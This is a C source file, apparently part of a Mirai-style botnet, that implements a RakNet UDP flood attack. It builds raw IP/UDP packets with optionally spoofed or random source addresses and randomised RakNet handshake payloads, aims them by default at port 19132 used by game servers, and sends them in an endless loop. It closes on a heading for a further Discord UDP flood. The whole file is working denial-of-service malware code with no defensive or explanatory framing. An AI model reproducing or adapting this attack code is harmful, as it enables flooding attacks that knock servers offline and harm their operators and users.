#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/if_ether.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>

#include "includes.h"
#include "attack.h"
#include "checksum.h"
#include "rand.h"
#include "util.h"
#include "protocol.h"


void attack_method_raknet(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof (char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 19132);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    static const unsigned char raknet_magic[16] = {
        0x00,0xFF,0xFF,0x00,0xFE,0xFE,0xFE,0xFE,
        0xFD,0xFD,0xFD,0xFD,0x12,0x34,0x56,0x78
    };

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        return;
    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
        close(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(256, sizeof (char));
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct udphdr *udph = (struct udphdr *)(iph + 1);
            unsigned char *data = (unsigned char *)(udph + 1);
            int plen;

            unsigned int r = rand_next() % 4;
            switch (r)
            {
            case 0:
                plen = 33;
                data[0] = 0x01;
                {
                    uint64_t ts = (uint64_t)time(NULL) * 1000 + (rand_next() % 1000);
                    util_memcpy(data + 1, &ts, 8);
                }
                util_memcpy(data + 9, raknet_magic, 16);
                {
                    uint64_t guid = ((uint64_t)rand_next() << 32) | rand_next();
                    util_memcpy(data + 25, &guid, 8);
                }
                break;
            case 1:
                plen = 18;
                data[0] = 0x05;
                util_memcpy(data + 1, raknet_magic, 16);
                data[17] = 11;
                break;
            case 2:
                plen = 33;
                data[0] = 0x07;
                util_memcpy(data + 1, raknet_magic, 16);
                util_memcpy(data + 17, &targs[i].addr, 4);
                {
                    uint16_t pp = htons(dport == 0xffff ? (rand_next() & 0xffff) : dport);
                    util_memcpy(data + 21, &pp, 2);
                }
                {
                    uint16_t mtu = 1400;
                    util_memcpy(data + 23, &mtu, 2);
                }
                {
                    uint64_t guid = ((uint64_t)rand_next() << 32) | rand_next();
                    util_memcpy(data + 25, &guid, 8);
                }
                break;
            default:
                plen = 26;
                data[0] = 0x09;
                {
                    uint64_t sg = ((uint64_t)rand_next() << 32) | rand_next();
                    util_memcpy(data + 1, &sg, 8);
                }
                {
                    uint64_t cg = ((uint64_t)rand_next() << 32) | rand_next();
                    util_memcpy(data + 9, &cg, 8);
                }
                {
                    uint64_t ts = (uint64_t)time(NULL) * 1000;
                    util_memcpy(data + 17, &ts, 8);
                }
                data[25] = 0;
                break;
            }

            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + plen);
            iph->id = htons(ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_UDP;
            iph->saddr = source_ip;
            iph->daddr = targs[i].addr;

            udph->source = sport == 0xffff ? (rand_next() & 0xffff) : htons(sport);
            udph->dest = (dport == 0xffff ? (rand_next() & 0xffff) : htons(dport));
            udph->len = htons(sizeof(struct udphdr) + plen);
            udph->check = 0;

            if (targs[i].netmask < 32)
            {
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
                util_memcpy(data + 17, &targs[i].addr, 4);
            }
            if (source_ip == 0xffffffff) iph->saddr = rand_next();
            if (ip_ident == 0xffff) iph->id = rand_next() & 0xffff;

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            targs[i].sock_addr.sin_port = udph->dest;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct udphdr) + plen,
                   MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
    }
}

/* ──── Discord UDP flood ──── */
